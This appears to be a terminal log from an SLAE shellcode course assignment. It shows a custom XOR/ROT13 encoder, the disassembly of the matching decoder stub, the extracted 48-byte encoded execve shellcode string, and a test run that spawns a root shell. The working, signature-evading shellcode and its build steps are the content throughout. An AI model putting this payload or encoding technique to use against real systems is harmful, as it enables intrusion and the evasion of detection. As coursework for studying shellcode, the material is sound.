@@ -1,0 +1,69 @@
+Step 1:
+
+root@kali:/home/SLAE/MY_EXP/assignment4# python xorrot13encoder.py
+\xa8\x77\x07\xcf\x92\x92\xe6\xcf\xcf\x92\xd5\xd0\xd1\x30\x56\x07\x30\x55\x06\x30\x58\x27\xae\x74\x37
+0xa8,0x77,0x07,0xcf,0x92,0x92,0xe6,0xcf,0xcf,0x92,0xd5,0xd0,0xd1,0x30,0x56,0x07,0x30,0x55,0x06,0x30,0x58,0x27,0xae,0x74,0x37,
+Len: 25
+
+
+Step 2:
+
+root@kali:/home/SLAE/MY_EXP/assignment4# nasm -f elf xorrot13decoder.nasm
+root@kali:/home/SLAE/MY_EXP/assignment4# ld -o xorrot13decoder xorrot13decoder.o
+root@kali:/home/SLAE/MY_EXP/assignment4# objdump -d xorrot13decoder -M intel
+
+xorrot13decoder:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+08048060 <_start>:
+ 8048060:       eb 10                   jmp    8048072 <call_shellcode>
+
+08048062 <decoder>:
+ 8048062:       5e                      pop    esi
+ 8048063:       31 c9                   xor    ecx,ecx
+ 8048065:       b1 19                   mov    cl,0x19
+
+08048067 <decode>:
+ 8048067:       80 2e 0d                sub    BYTE PTR [esi],0xd
+ 804806a:       80 36 aa                xor    BYTE PTR [esi],0xaa
+ 804806d:       46                      inc    esi
+ 804806e:       e2 f7                   loop   8048067 <decode>
+ 8048070:       eb 05                   jmp    8048077 <shellcode>
+
+08048072 <call_shellcode>:
+ 8048072:       e8 eb ff ff ff          call   8048062 <decoder>
+
+08048077 <shellcode>:
+ 8048077:       a8 77                   test   al,0x77
+ 8048079:       07                      pop    es
+ 804807a:       cf                      iret
+ 804807b:       92                      xchg   edx,eax
+ 804807c:       92                      xchg   edx,eax
+ 804807d:       e6 cf                   out    0xcf,al
+ 804807f:       cf                      iret
+ 8048080:       92                      xchg   edx,eax
+ 8048081:       d5 d0                   aad    0xd0
+ 8048083:       d1                      (bad)
+ 8048084:       30 56 07                xor    BYTE PTR [esi+0x7],dl
+ 8048087:       30 55 06                xor    BYTE PTR [ebp+0x6],dl
+ 804808a:       30 58 27                xor    BYTE PTR [eax+0x27],bl
+ 804808d:       ae                      scas   al,BYTE PTR es:[edi]
+ 804808e:       74 37                   je     80480c7 <shellcode+0x50>
+root@kali:/home/SLAE/MY_EXP/assignment4#
+root@kali:/home/SLAE/MY_EXP/assignment4# objdump -d ./xorrot13decoder|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+"\xeb\x10\x5e\x31\xc9\xb1\x19\x80\x2e\x0d\x80\x36\xaa\x46\xe2\xf7\xeb\x05\xe8\xeb\xff\xff\xff\xa8\x77\x07\xcf\x92\x92\xe6\xcf\xcf\x92\xd5\xd0\xd1\x30\x56\x07\x30\x55\x06\x30\x58\x27\xae\x74\x37"
+root@kali:/home/SLAE/MY_EXP/assignment4#
+
+
+Step3: 
+
+root@kali:/home/SLAE/MY_EXP/assignment4# gcc -fno-stack-protector -z execstack xorrot13shellcode.c -o xorrot13shellcode
+root@kali:/home/SLAE/MY_EXP/assignment4# ./xorrot13shellcode
+Shellcode Length:  48
+# uname -a
+Linux kali 4.4.0-kali1-686 #1 SMP Debian 4.4.2-3kali1 (2016-02-23) i686 GNU/Linux
+# id
+uid=0(root) gid=0(root) groups=0(root)
+#
